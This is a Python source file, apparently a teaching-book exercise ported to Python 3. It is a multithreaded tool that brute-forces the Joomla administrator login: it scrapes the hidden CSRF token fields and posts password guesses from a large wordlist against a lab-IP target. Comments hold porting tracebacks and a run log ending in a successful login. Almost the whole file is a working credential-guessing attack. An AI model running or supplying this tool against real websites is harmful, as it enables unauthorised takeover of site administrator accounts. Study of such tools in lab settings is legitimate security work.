#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import urllib.request, urllib.error, urllib.parse 
import urllib.request, urllib.parse, urllib.error
import http.cookiejar
import threading
import sys
import queue

from html.parser import HTMLParser

# general settings
user_thread   = 10
username      = "admin"
wordlist_file = "./cain.txt"
resume        = None

# target specific settings
# target_url    = "http://192.168.112.131/administrator/index.php"
# target_post   = "http://192.168.112.131/administrator/index.php"
target_url    = "http://192.168.17.129/Joomla/administrator/index.php"
target_post   = "http://192.168.17.129/Joomla/administrator/index.php"

username_field= "username"
password_field= "passwd"

# success_check = "Administration - Control Panel"
success_check = "Control Panel" #Joomla_3.6.2-Stable-Full_Package


class BruteParser(HTMLParser):
    
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}
        
    def handle_starttag(self, tag, attrs):
        if tag == "input":
            tag_name  = None
            tag_value = None
            print("attrs: %s" % attrs)
            for name,value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            
            if tag_name is not None:
                self.tag_results[tag_name] = value

                
# Trying: admin : 5252 (306639 left)
# print "attrs: %s" % attrs
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '75b396ab21e2ab1e48b952e5456820ec'), ('value', '1')]

class Bruter(object):
    def __init__(self, username, words):
        
        self.username   = username
        self.password_q = words
        self.found      = False
        
        print("Finished setting up for: %s" % username)
        
    def run_bruteforce(self):
        
        for i in range(user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()
    
    def web_bruter(self):
        
        while not self.password_q.empty() and not self.found:
            # brute = self.password_q.get().rstrip()
            brute = self.password_q.get().rstrip().decode('utf-8') #convert 'bytes' object to str
            jar = http.cookiejar.FileCookieJar("cookies")
            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
            
            response = opener.open(target_url)
            
            page = response.read()
            # print(page)
            
            print("Trying: %s : %s (%d left)" % (self.username,brute,self.password_q.qsize()))

            # parse out the hidden fields
            parser = BruteParser()
            # parser.feed(page)
            parser.feed(page.decode('utf-8')) #convert 'bytes' object to str
            
            # Traceback (most recent call last):
            # File "/usr/lib/python3.5/threading.py", line 914, in _bootstrap_inner
                # self.run()
            # File "/usr/lib/python3.5/threading.py", line 862, in run
                # self._target(*self._args, **self._kwargs)
            # File "joomla_killer.py", line 90, in web_bruter
                # parser.feed(page)
            # File "/usr/lib/python3.5/html/parser.py", line 110, in feed
                # self.rawdata = self.rawdata + data
            # TypeError: Can't convert 'bytes' object to str implicitly

            post_tags = parser.tag_results
            
            # add our username and password fields
            post_tags[username_field] = self.username
            post_tags[password_field] = brute
            
            # login_data = urllib.parse.urlencode(post_tags)
            login_data = urllib.parse.urlencode(post_tags).encode("utf-8") #convert str to 'bytes'
            login_response = opener.open(target_post, login_data)
            
            # Traceback (most recent call last):
            # File "/usr/lib/python3.5/threading.py", line 914, in _bootstrap_inner
                # self.run()
            # File "/usr/lib/python3.5/threading.py", line 862, in run
                # self._target(*self._args, **self._kwargs)
            # File "joomla_killer.py", line 99, in web_bruter
                # login_response = opener.open(target_post, login_data)
            # File "/usr/lib/python3.5/urllib/request.py", line 463, in open
                # req = meth(req)
            # File "/usr/lib/python3.5/urllib/request.py", line 1170, in do_request_
                # raise TypeError(msg)
            # TypeError: POST data should be bytes or an iterable of bytes. It cannot be of type str.
            
            # login_result = login_response.read()
            login_result = login_response.read().decode('utf-8') #convert 'bytes' object to str
            

            # Traceback (most recent call last):
            # File "/usr/lib/python3.5/threading.py", line 914, in _bootstrap_inner
                # self.run()
            # File "/usr/lib/python3.5/threading.py", line 862, in run
                # self._target(*self._args, **self._kwargs)
            # File "joomla_killer.py", line 106, in web_bruter
                # if success_check in login_result:
            # TypeError: a bytes-like object is required, not 'str'


            if success_check in login_result:
                self.found = True
                
                print("[*] Bruteforce successful.")
                print("[*] Username: %s" % username)
                print("[*] Password: %s" % brute)
                print("[*] Waiting for other threads to exit...")

            # print("login_result") 
            # print(login_result) 
                
def build_wordlist(wordlist_file):

    # read in the word list
    fd = open(wordlist_file,"rb") 
    raw_words = fd.readlines()
    fd.close()
    
    found_resume = False
    words        = queue.Queue()
    
    for word in raw_words:
        
        word = word.rstrip()
        
        if resume is not None:
            
            if found_resume:
                words.put(word)
            else:
                if word == resume:
                    found_resume = True
                    print("Resuming wordlist from: %s" % resume)
                                        
        else:
            words.put(word)
    
    return words            

words = build_wordlist(wordlist_file)


bruter_obj = Bruter(username,words)
bruter_obj.run_bruteforce()



# root@kali:/home/han/BHP-Code/Chapter5/python3-version# python3 joomla_killer.py 2>&1 | tee 1.log

# Finished setting up for: admin
# Trying: admin : !@#$%^&* (306696 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', 'a46aceadc991a21b015d4a1982d6ff72'), ('value', '1')]
# Trying: admin : han (306653 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '6d99290ac934b3f075fec05669e366a3'), ('value', '1')]
# Trying: admin : 2000 (306653 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '334606add5a7ced222b503901ce51876'), ('value', '1')]
# Trying: admin : 20 (306651 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '0660f03f36d161434833ceb4c26571ce'), ('value', '1')]
# Trying: admin : 2001 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '0d5e05b87e7b8386a3e4d518ffdbd490'), ('value', '1')]
# Trying: admin : 2002 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', 'cc68fea1a8d21f3dd455a16275ce373a'), ('value', '1')]
# Trying: admin : 2112 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '1020a5a5bccb2a4d18370d5e4f72cc8b'), ('value', '1')]
# Trying: admin : 2222 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '3cd8952f9c1cb5e467aa00a2279771f5'), ('value', '1')]
# Trying: admin : 21122112 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '3f4b2c8363e655c3e216c752e6658799'), ('value', '1')]
# Trying: admin : 2003 (306648 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '4692485b5582a53176a0f5b0257ef982'), ('value', '1')]
# Trying: admin : 249 (306646 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]Trying: admin : 246 (306646 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '12d85e122c4bfb234e38825af248eadb'), ('value', '1')]

# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '3b3595c979ccf7ca7523d5623b96f712'), ('value', '1')]
# [*] Bruteforce successful.
# [*] Username: admin
# [*] Password: han
# [*] Waiting for other threads to exit...
# Trying: admin : 2welcome (306644 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '72a5bf6be9389d1bb13b09f1ad9ff21d'), ('value', '1')]
# Trying: admin : 369 (306644 left)
# attrs: [('name', 'username'), ('tabindex', '1'), ('id', 'mod-login-username'), ('type', 'text'), ('class', 'input-medium'), ('placeholder', 'Username'), ('size', '15'), ('autofocus', 'true')]
# attrs: [('name', 'passwd'), ('tabindex', '2'), ('id', 'mod-login-password'), ('type', 'password'), ('class', 'input-medium'), ('placeholder', 'Password'), ('size', '15')]
# attrs: [('type', 'hidden'), ('name', 'option'), ('value', 'com_login')]
# attrs: [('type', 'hidden'), ('name', 'task'), ('value', 'login')]
# attrs: [('type', 'hidden'), ('name', 'return'), ('value', 'aW5kZXgucGhw')]
# attrs: [('type', 'hidden'), ('name', '160d13f5dad7bd389fab247f786d5cac'), ('value', '1')]


